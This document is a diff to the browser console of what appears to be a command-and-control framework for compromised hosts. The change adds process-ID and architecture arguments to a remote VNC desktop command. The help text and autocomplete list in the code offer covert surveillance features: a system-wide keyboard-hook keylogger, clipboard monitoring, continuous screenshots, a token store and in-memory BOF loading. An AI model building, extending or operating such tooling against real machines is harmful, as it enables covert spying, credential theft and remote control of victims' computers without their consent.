@@ -5131,14 +5131,18 @@ function vncDetachEvents() {
   if (canvas._vncCtxMenu) canvas.removeEventListener('contextmenu',canvas._vncCtxMenu);
 }
 
-function openDesktop(agentId, quality) {
+function openDesktop(agentId, quality, pid, arch) {
   quality = quality || 60;
+  pid = pid || 0;
+  arch = arch || 'x64';
   const a = agents.find(x => x.id === agentId);
   const short = agentId.substring(0,8);
   const label = a ? `🖥 ${a.hostname}·${short}` : `🖥 ${short}`;
 
   // Start VNC session on server
-  api('POST', '/api/vnc', {agent_id: agentId, quality}).then(r => {
+  const vncBody = {agent_id: agentId, quality};
+  if (pid > 0) { vncBody.pid = pid; vncBody.arch = arch; }
+  api('POST', '/api/vnc', vncBody).then(r => {
     if (!r?.ok) { addConsoleOutput('', r?.error || 'vnc start failed', null); return; }
 
     document.getElementById('console-pane').classList.add('open');
@@ -10262,7 +10266,7 @@ const AC_COMMANDS = [
   ['token-store clear','token-store clear — clear token store'],
   ['screenwatch start','screenwatch start [secs] — continuous screenshots (default: 30s)'],
   ['screenwatch stop','screenwatch stop — stop continuous screenshots'],
-  ['desktop','desktop [low|med|high|best|<quality>] — interactive VNC desktop viewer'],
+  ['desktop','desktop [pid] [x86|x64] [high|med|low|<quality>] — interactive VNC desktop viewer'],
   ['desktop stop','desktop stop — close the VNC desktop session'],
   ['bof-store load','bof-store load <name> <file.coff> — preload BOF into memory'],
   ['bof-store list','bof-store list — list preloaded BOFs'],
@@ -10737,8 +10741,8 @@ ${isWin ? `
 <span class="console-section">COLLECTION</span>
   screenshot                         screenshot → server
   screenwatch start [secs] / stop    automatic periodic screenshots (default every 30s)
-  desktop [low|med|high|best]        interactive VNC desktop viewer (default: med quality)
-  desktop stop                       close the VNC desktop session
+  desktop [pid] [x86|x64] [high|med|low]  interactive VNC desktop viewer
+  desktop stop                             close the VNC desktop session
   keylog start|stop|dump             WH_KEYBOARD_LL keylogger (system-level keyboard hook)
   clip                               read clipboard (one-shot)
   clip-monitor start / dump / stop   monitor clipboard continuously
@@ -12845,8 +12849,9 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       break;
     }
     case 'desktop': {
-      // desktop [stop|low|med|high] [quality]
-      const dparts = args.trim().split(/\s+/);
+      // desktop [pid] [x86|x64] [high|med|low|<quality>]
+      // desktop stop
+      const dparts = args.trim().split(/\s+/).filter(Boolean);
       if (dparts[0] === 'stop') {
         api('DELETE', '/api/vnc', {agent_id: activeAgent.id}).then(r => {
           if (r?.ok) {
@@ -12858,12 +12863,20 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
         });
         return;
       }
-      let quality = 60;
-      const qMap = {low:30, med:60, high:85, best:95};
-      if (qMap[dparts[0]]) quality = qMap[dparts[0]];
-      else if (parseInt(dparts[0])) quality = parseInt(dparts[0]);
-      if (dparts[1] && parseInt(dparts[1])) quality = parseInt(dparts[1]);
-      openDesktop(activeAgent.id, quality);
+      // Parse: desktop [pid] [x86|x64] [high|med|low|<1-100>]
+      // Numbers >100 = PID, numbers 1-100 = JPEG quality
+      const qMap = {low:30, med:60, high:90, best:95};
+      let pid = 0, arch = 'x64', quality = 60;
+      for (const part of dparts) {
+        if (part === 'x86' || part === 'x64') { arch = part; }
+        else if (qMap[part] !== undefined) { quality = qMap[part]; }
+        else if (/^\d+$/.test(part)) {
+          const n = parseInt(part);
+          if (n > 100) pid = n;
+          else if (n >= 1) quality = n;
+        }
+      }
+      openDesktop(activeAgent.id, quality, pid, arch);
       return;
     }
     case 'bof-store': {
